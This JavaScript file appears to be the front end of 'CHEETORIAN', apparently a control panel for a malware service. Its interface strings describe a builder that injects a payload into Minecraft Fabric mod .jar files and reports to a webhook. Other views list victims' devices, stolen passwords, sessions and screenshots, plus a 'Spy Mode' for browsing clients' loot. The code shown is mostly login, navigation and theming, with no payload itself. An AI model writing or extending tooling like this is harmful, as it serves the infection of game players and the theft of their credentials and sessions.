const SUPABASE_URL = 'https://sfzerzriyihjzwzmmypl.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNmemVyenJpeWloanp3em1teXBsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2NzcwNjcsImV4cCI6MjA5MTI1MzA2N30.-djIOGgeHdva9JNOIQuXsIoKUH_o-8gj6kZxu1AGBf0';
const apiClient = window.supabase ? window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY) : null;

const SVG_ICONS = {
    'hammer': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>',
    'crosshairs': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="22" y1="12" x2="18" y2="12"/><line x1="6" y1="12" x2="2" y2="12"/><line x1="12" y1="6" x2="12" y2="2"/><line x1="12" y1="22" x2="12" y2="18"/></svg>',
    'box': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/></svg>',
    'key': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>',
    'users': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>',
    'user': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>',
    'settings': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>',
    'shield': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>',
    'shield-alert': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>',
    'shield-check': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>',
    'crown': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2.5 16.5L3 18.5h18l.5-2-4.5-3.5L12 19l-5-6-4.5 3.5z"/><line x1="2" y1="21.5" x2="22" y2="21.5"/><circle cx="12" cy="7" r="1.5"/><circle cx="2.5" cy="11.5" r="1.5"/><circle cx="21.5" cy="11.5" r="1.5"/></svg>',
    'power': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></svg>',
    'user-check': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="8.5" cy="7" r="4"/><polyline points="17 11 19 13 23 9"/></svg>',
    'lock': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>',
    'arrow-right': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>',
    'user-plus': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="8.5" cy="7" r="4"/><line x1="20" y1="8" x2="20" y2="14"/><line x1="23" y1="11" x2="17" y2="11"/></svg>',
    'mail': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>',
    'cpu': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="16" rx="2" ry="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="14" x2="23" y2="14"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="14" x2="4" y2="14"/></svg>',
    'sliders': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="21" x2="4" y2="14"/><line x1="4" y1="10" x2="4" y2="3"/><line x1="12" y1="21" x2="12" y2="12"/><line x1="12" y1="8" x2="12" y2="3"/><line x1="20" y1="21" x2="20" y2="16"/><line x1="20" y1="12" x2="20" y2="3"/><line x1="1" y1="14" x2="7" y2="14"/><line x1="9" y1="8" x2="15" y2="8"/><line x1="17" y1="16" x2="23" y2="16"/></svg>',
    'webhook': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 16.98h-5.99c-1.14 0-2.07-.93-2.07-2.07v-4.9c0-1.14.93-2.07 2.07-2.07h5.99"/><circle cx="18" cy="17" r="3"/><circle cx="18" cy="7" r="3"/><circle cx="6" cy="12" r="3"/></svg>',
    'tag': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"/><line x1="7" y1="7" x2="7.01" y2="7"/></svg>',
    'git-commit-horizontal': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M16 12h6"/><path d="M2 12h6"/></svg>',
    'syringe': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9.5" y="6" width="5" height="12" rx="2" transform="rotate(-45 12 12)"/><path d="M12 12L20.5 3.5M17 19l4-4M3 21l3-3M5.5 13L2 9.5l4-4"/></svg>',
    'upload-cloud': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 16 12 12 8 16"/><line x1="12" y1="12" x2="12" y2="21"/><path d="M20.39 18.39A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.3"/><polyline points="16 16 12 12 8 16"/></svg>',
    'hard-drive': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="12" x2="2" y2="12"/><path d="M5.45 5.11L2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"/><line x1="6" y1="16" x2="6.01" y2="16"/><line x1="10" y1="16" x2="10.01" y2="16"/></svg>',
    'check-circle': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>',
    'terminal': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>',
    'ghost': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 10h.01M15 10h.01M12 2a8 8 0 0 0-8 8v12l3-3 2.5 2.5L12 19l2.5 2.5L17 19l3 3V10a8 8 0 0 0-8-8z"/></svg>',
    'image': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>',
    'monitor-smartphone': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8V6a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h3"/><path d="M21 21v-8a2 2 0 0 0-2-2h-3a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h3a2 2 0 0 0 2-2z"/></svg>',
    'save': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/></svg>',
    'scan-eye': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7V5a2 2 0 0 1 2-2h2M17 3h2a2 2 0 0 1 2 2v2M21 17v2a2 2 0 0 1-2 2h-2M7 21H5a2 2 0 0 1-2-2v-2"/><circle cx="12" cy="12" r="3"/><path d="M5 12s2.5-5 7-5 7 5 7 5-2.5 5-7 5-7-5-7-5z"/></svg>',
    'log-out': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>',
    'activity': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>',
    'palette': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="13.5" cy="6.5" r=".5"/><circle cx="17.5" cy="10.5" r=".5"/><circle cx="8.5" cy="7.5" r=".5"/><circle cx="6.5" cy="12.5" r=".5"/><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10c.926 0 1.648-.746 1.648-1.688 0-.437-.18-.835-.437-1.125-.29-.289-.438-.652-.438-1.125a1.64 1.64 0 0 1 1.668-1.668h1.996c3.051 0 5.555-2.503 5.555-5.554C21.965 6.012 17.461 2 12 2z"/></svg>',
    'monitor': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>',
    'x': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>',
    'info': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>',
    'loader': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><g class="fa-spin"><line x1="12" y1="2" x2="12" y2="6"/><line x1="12" y1="18" x2="12" y2="22"/><line x1="4.93" y1="4.93" x2="7.76" y2="7.76"/><line x1="16.24" y1="16.24" x2="19.07" y2="19.07"/><line x1="2" y1="12" x2="6" y2="12"/><line x1="18" y1="12" x2="22" y2="12"/><line x1="4.93" y1="19.07" x2="7.76" y2="16.24"/><line x1="16.24" y1="7.76" x2="19.07" y2="4.93"/></g></svg>',
    'inbox': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 16 12 14 15 10 15 8 12 2 12"/><path d="M5.45 5.11L2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"/></svg>',
    'layers': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg>',
    'target': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>',
    'globe': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>'
};

const DICT = {
    'pl': {
        'a-title': 'CHEETORIAN', 'a-sub': 'Zaloguj się do panelu głównego', 'a-log': 'Logowanie', 'a-reg': 'Rejestracja', 'a-btn1': 'Autoryzuj', 'a-btn2': 'Utwórz konto',
        'n-stat': 'Status', 'n-tools': 'Menu', 'n-build': 'Builder', 'n-logs': 'Logi', 'n-hits': 'Urządzenia', 'n-sess': 'Sesje', 'n-pwd': 'Hasła', 'n-plat': 'Platforma', 'n-spy': 'Admin', 'n-acc': 'Profil', 'n-thm': 'Motywy', 'n-role': 'Właściciel',
        'b-t1': 'Fabric 1.21.x Builder', 'b-t2': 'Konstruktor bezpiecznego pliku gry (Template Mod).', 'b-h1': 'Główne Parametry', 'b-l1': 'Punkt zdawczy (Webhook URL)', 'b-l2': 'Nazwa Moda', 'b-l3': 'Wersja', 'b-l4': 'Nakładka kodu (Inject)', 'b-l5': 'Zbuduj Payload na wierzchu pliku .jar', 'b-fbtn': 'Wybierz plik', 'b-wait': 'Czekam na ładunek...', 'b-lim': 'Limit rozmiaru', 'b-btn': 'Generuj Konstrukcje', 'b-term': 'Terminal Live',
        'p-t1': 'Twój Profil', 'p-t2': 'Skonfiguruj główne parametry dostępu.', 'p-b1': 'Plan: UNLIMITED CHEETORIAN', 'p-b2': 'Dodaj Awatar', 'p-nick': 'Wyświetlana Nazwa (Nick)', 'p-h1': 'Zmiana Hasła', 'p-l1': 'Obecne Hasło', 'p-l2': 'Nowe Hasło', 'p-sbtn': 'Zapisz',
        'h-t1': 'Połączenia', 's-t1': 'Sesje', 'w-t1': 'Loginy', 'u-t1': 'Szpiegostwo', 'u-t2': 'Przeglądaj profile klientów.',
        'spy-t1': 'Tryb Szpiega', 'spy-t2': 'Podgląd gracza:', 'spy-out': 'Zakończ', 'spy-m1': 'Maszyny', 'spy-m2': 'Hasła', 'spy-m3': 'Sesje', 'spy-m4': 'Zrzuty',
        'c-t1': 'Edytor Wyglądu', 'c-t2': 'Kolory', 'mod-t1': 'Monitor',
        'ph-user': 'Użytkownik', 'ph-pass': 'Hasło', 'ph-mail': 'E-Mail', 'toast-spy': 'Zhakowano profil dla: ', 'toast-prof': 'Profil zaktualizowany!', 'toast-err': 'Błąd autoryzacji!'
    },
    'en': {
        'a-title': 'CHEETORIAN', 'a-sub': 'Log in to the main control panel', 'a-log': 'Login', 'a-reg': 'Register', 'a-btn1': 'Authorize', 'a-btn2': 'Create account',
        'n-stat': 'Status', 'n-tools': 'Menu', 'n-build': 'Builder', 'n-logs': 'Logs', 'n-hits': 'Devices', 'n-sess': 'Sessions', 'n-pwd': 'Passwords', 'n-plat': 'Platform', 'n-spy': 'Admin', 'n-acc': 'Profile', 'n-thm': 'Themes', 'n-role': 'Owner',
        'b-t1': 'Fabric 1.21.x Builder', 'b-t2': 'Secure game file constructor (Template Mod).', 'b-h1': 'Main Parameters', 'b-l1': 'Endpoint (Webhook URL)', 'b-l2': 'Mod Name', 'b-l3': 'Version', 'b-l4': 'Code Overlay (Inject)', 'b-l5': 'Build Payload on top of a .jar file', 'b-fbtn': 'Select file', 'b-wait': 'Waiting for payload...', 'b-lim': 'Size limit', 'b-btn': 'Generate Build', 'b-term': 'Live Terminal',
        'p-t1': 'Your Profile', 'p-t2': 'Configure primary access parameters.', 'p-b1': 'Plan: UNLIMITED CHEETORIAN', 'p-b2': 'Upload Avatar', 'p-nick': 'Nickname', 'p-h1': 'Security', 'p-l1': 'Current Password', 'p-l2': 'New Password', 'p-sbtn': 'Save',
        'h-t1': 'Connections', 's-t1': 'Sessions', 'w-t1': 'Logins', 'u-t1': 'Spying', 'u-t2': 'Browse registered clients.',
        'spy-t1': 'Spy Mode', 'spy-t2': 'Viewing panel:', 'spy-out': 'Exit', 'spy-m1': 'Machines', 'spy-m2': 'Passwords', 'spy-m3': 'Sessions', 'spy-m4': 'Screens',
        'c-t1': 'Appearance Personalization', 'c-t2': 'Color Spectrum', 'mod-t1': 'Screenshot (.PNG)',
        'ph-user': 'Username', 'ph-pass': 'Password', 'ph-mail': 'E-Mail Address', 'toast-spy': 'Spectator mode bridge created for profile: ', 'toast-prof': 'Profile updated successfully!', 'toast-err': 'Password mismatch or incorrect data!'
    }
};

let currentLang = 'pl';

function toggleLang() {
    currentLang = currentLang === 'pl' ? 'en' : 'pl';
    document.getElementById('current-lang-text').innerText = currentLang === 'pl' ? 'Język: PL 🇵🇱' : 'Language: EN 🇬🇧';
    document.querySelectorAll('[data-i18n]').forEach(el => {
        let key = el.getAttribute('data-i18n');
        if(DICT[currentLang][key]) el.innerHTML = DICT[currentLang][key];
    });
    document.querySelectorAll('[data-i18n-ph]').forEach(el => {
        let key = el.getAttribute('data-i18n-ph');
        if(DICT[currentLang][key]) el.setAttribute('placeholder', DICT[currentLang][key]);
    });
}

function safeDrawIcons() {
    document.querySelectorAll('i[data-lucide]').forEach(el => {
        let name = el.getAttribute('data-lucide');
        if (SVG_ICONS[name]) {
            let svgCont = document.createElement('div');
            svgCont.innerHTML = SVG_ICONS[name];
            let svgNode = svgCont.firstChild;
            if (el.className) svgNode.setAttribute('class', el.className);
            if (el.style.cssText) svgNode.style.cssText = el.style.cssText;
            svgNode.setAttribute('width', el.style.width || '20');
            svgNode.setAttribute('height', el.style.height || '20');
            el.parentNode.replaceChild(svgNode, el);
        }
    });
}

function tryExecute(fn) {
    try { fn(); } catch(e) { console.error("Initialization Error: ", e); }
}

function initApp() {
    tryExecute(() => initParticles('circle', 3));
    safeDrawIcons();

    const authTabs = document.querySelectorAll('.auth-tab');
    const authForms = document.querySelectorAll('.auth-form');
    authTabs.forEach(tab => {
        tab.addEventListener('click', (e) => {
            const tTab = e.currentTarget;
            authTabs.forEach(t => t.classList.remove('active'));
            authForms.forEach(f => f.classList.remove('active'));
            tTab.classList.add('active');
            let formId = tTab.getAttribute('data-target') + '-form';
            let frm = document.getElementById(formId);
            if(frm) frm.classList.add('active');
        });
    });

    const navLinks = document.querySelectorAll('.nav-links li');
    const pages = document.querySelectorAll('.page');
    navLinks.forEach(link => {
        link.addEventListener('click', (e) => {
            try {
                const tLink = e.currentTarget;
                navLinks.forEach(l => l.classList.remove('active'));
                pages.forEach(p => p.classList.remove('active'));
                
                tLink.classList.add('active');
                const pageId = tLink.getAttribute('data-page');
                const pageEl = document.getElementById(`page-${pageId}`);
                if(pageEl) pageEl.classList.add('active');
            } catch(ex) { console.error(ex); }
        });
    });

    tryExecute(() => renderEmptyState('hits-table-body', 4));
    tryExecute(() => renderEmptyState('pwd-table-body', 4));
    tryExecute(() => {
        const list = document.getElementById('session-hits-list');
        if(list) list.innerHTML = `<div style="text-align:center; padding: 60px; color:var(--text-muted);"><i data-lucide="layers" style="width:50px; height:50px; opacity:0.2; margin-bottom:15px;"></i><br><span style="font-size:1.1rem; font-weight:600;">System Gotowy</span></div>`;
        safeDrawIcons();
    });
    tryExecute(() => renderAdminUsers());
    
    // Auto-login z Supabase
    if(apiClient) {
        apiClient.auth.getSession().then(({ data: { session } }) => {
            if (session) {
                loadUserData(session.user.email);
                document.getElementById('auth-view').classList.remove('active');
                document.getElementById('dashboard-view').classList.add('active');
                safeDrawIcons();
            }
        }).catch(e => console.error("Session fetch err:", e));
        
        apiClient.auth.onAuthStateChange((_event, session) => {
            if (session) {
                loadUserData(session.user.email);
            }
        });
    }

}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initApp);
} else {
    initApp();
}

function initParticles(shape, size) {
    if(window.pJSDom && window.pJSDom.length > 0) {
        try { window.pJSDom[0].pJS.fn.vendors.destroypJS(); window.pJSDom = []; } catch(e){}
    }
    const rootStyle = getComputedStyle(document.documentElement);
    let particleColor = rootStyle.getPropertyValue('--primary').trim() || '#007aff';
    if(typeof particlesJS !== 'undefined') {
        particlesJS('particles-js', {
            "particles": {"number": {"value": 35},"color": {"value": particleColor},"shape": {"type": shape},"opacity": {"value": 0.4},"size": {"value": parseInt(size)},"line_linked": {"enable": true, "distance": 180, "color": particleColor, "opacity": 0.2, "width": 1.5},"move": {"enable": true, "speed": 1.5, "direction": "none", "random": true, "out_mode": "out"}},
            "interactivity": {"detect_on": "canvas","events": {"onhover": {"enable": false}, "onclick": {"enable": false}}}
        });
    }
}

function setTheme(primary, secondary, glow) {
    document.documentElement.style.setProperty('--primary', primary);
    document.documentElement.style.setProperty('--secondary', secondary);
    document.documentElement.style.setProperty('--primary-glow', glow);
    tryExecute(() => initParticles('circle', 3));
}

async function handleLogin() {
    const email = document.getElementById('log-user').value;
    const pass = document.getElementById('log-pass').value;
    if(!email || !pass) return;
    
    showToast("Nawiązywanie połączenia (Supabase)...");
    const { data, error } = await apiClient.auth.signInWithPassword({
        email: email,
        password: pass,
    });

    if (error) {
        showToast("Błąd logowania: " + error.message);
    } else {
        localStorage.setItem('currentUser', email);
        document.getElementById('auth-view').classList.remove('active');
        setTimeout(() => {
            document.getElementById('dashboard-view').classList.add('active');
            safeDrawIcons();
        }, 250);
        showToast("Pomyślnie zautoryzowano!");
    }
}

async function handleRegister() {
    const email = document.getElementById('reg-mail').value;
    const pass = document.getElementById('reg-pass').value;
    const uName = document.getElementById('reg-user').value;

    if(!email || !pass) {
        showToast("E-mail i hasło są wymagane do rejestracji bazy danych.");
        return;
    }
    
    showToast("Weryfikacja w chmurze Supabase...");
    const { data, error } = await apiClient.auth.signUp({
        email: email,
        password: pass,
        options: {
            data: { display_name: uName }
        }
    });

    if (error) {
        showToast("Błąd rejestracji: " + error.message);
    } else {
        showToast("Konto utworzone w bazie roboczej! Zaloguj się.");
        document.querySelector('[data-target="login"]').click();
        document.getElementById('log-user').value = email;
    }
}

const OWNER_EMAIL = 'admin@cheetorian.com';

function loadUserData(email) {
    let dispName = email.split('@')[0];
    document.getElementById('sidebar-username').innerText = dispName;
    document.getElementById('profile-username').innerText = dispName;
    
    // System Ról i Dostępu
    const isAdmin = (email.toLowerCase() === OWNER_EMAIL);
    const roleDisplay = document.getElementById('role-display');
    const navAdmin = document.getElementById('nav-item-admin');
    
    if (isAdmin) {
        roleDisplay.innerText = 'OWNER';
        roleDisplay.style.color = 'var(--primary)';
        if (navAdmin) navAdmin.style.display = 'flex';
    } else {
        roleDisplay.innerText = 'FREE';
        roleDisplay.style.color = 'var(--text-muted)';
        if (navAdmin) navAdmin.style.display = 'none';
        
        // Zabezpieczenie przed przebywaniem na zablokowanej zakładce
        const adminPage = document.getElementById('page-users-admin');
        if (adminPage && adminPage.classList.contains('active')) {
            document.querySelector('[data-page="build"]').click();
        }
    }
    
    const db = JSON.parse(localStorage.getItem('cheet_db') || '{"users":{}}');
    if(db.users[email] && db.users[email].avatar) {
         document.getElementById('profile-avatar-display').innerHTML = `<img src="${db.users[email].avatar}" style="width:100%; height:100%; object-fit:cover; border-radius:30px;">`;
         document.getElementById('sidebar-avatar').innerHTML = `<img src="${db.users[email].avatar}" style="width:100%; height:100%; object-fit:cover; border-radius:14px;">`;
    }
}

function login() {
    document.getElementById('auth-view').classList.remove('active');
    setTimeout(() => { document.getElementById('dashboard-view').classList.add('active'); safeDrawIcons(); }, 250);
}

async function logout() {
    if(typeof apiClient !== 'undefined' && apiClient) {
        await apiClient.auth.signOut();
    }
    localStorage.removeItem('currentUser');
    document.getElementById('dashboard-view').classList.remove('active');
    setTimeout(() => { document.getElementById('auth-view').classList.add('active'); }, 250);
}

/* ================================
   PROFILE LOGIC (IMAGE + NICKNAME) 
==================================*/
function handleAvatarUpload(event) {
    const file = event.target.files[0];
    if(file) {
        const reader = new FileReader();
        reader.onload = function(e) {
            const avatarUrl = e.target.result;
            document.getElementById('profile-avatar-display').innerHTML = `<img src="${avatarUrl}" style="width:100%; height:100%; object-fit:cover; border-radius:30px;">`;
            document.getElementById('sidebar-avatar').innerHTML = `<img src="${avatarUrl}" style="width:100%; height:100%; object-fit:cover; border-radius:14px;">`;
            
            const currentUser = localStorage.getItem('currentUser');
            if(currentUser) {
                const db = JSON.parse(localStorage.getItem('cheet_db') || '{"users":{}}');
                if(!db.users[currentUser]) db.users[currentUser] = {};
                db.users[currentUser].avatar = avatarUrl;
                localStorage.setItem('cheet_db', JSON.stringify(db));
            }
            showToast(DICT[currentLang]['toast-prof']);
        };
        reader.readAsDataURL(file);
    }
}

async function saveProfileChanges() {
    const nick = document.getElementById('profile-nick-input').value.trim();
    const currentPass = document.getElementById('profile-old-pass').value;
    const newPass = document.getElementById('profile-new-pass').value;
    
    // Zmiana hasła poprzez API bazy
    if(currentPass !== '' && newPass.trim() !== '') {
        const { error } = await apiClient.auth.updateUser({ password: newPass });
        if(error) {
            showToast("Błąd autoryzyacji zmiany: " + error.message);
            return;
        } else {
            showToast("Hasło nadpisane na serwerze! Zaloguj się ponownie.");
            await logout();
            return;
        }
    }

    // Aktualizacja widocznego UI
    if(nick !== '') {
        document.getElementById('profile-username').innerText = nick;
        document.getElementById('sidebar-username').innerText = nick;
